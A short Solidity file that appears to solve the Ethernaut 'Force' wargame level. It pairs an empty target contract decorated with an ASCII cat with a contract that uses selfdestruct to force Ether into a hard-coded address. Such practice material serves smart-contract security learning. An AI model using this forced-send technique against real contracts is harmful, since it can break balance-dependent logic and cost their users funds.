// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
  /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract SendEthDestructingContract {
  address payable contractAddr = payable(0xd7Ec5d29851ff6f4617701a21AF7b17e82d8BaB4);

  function destructCOntractToSendEth() external {
    selfdestruct(contractAddr);
  }

  receive() external payable {}
}
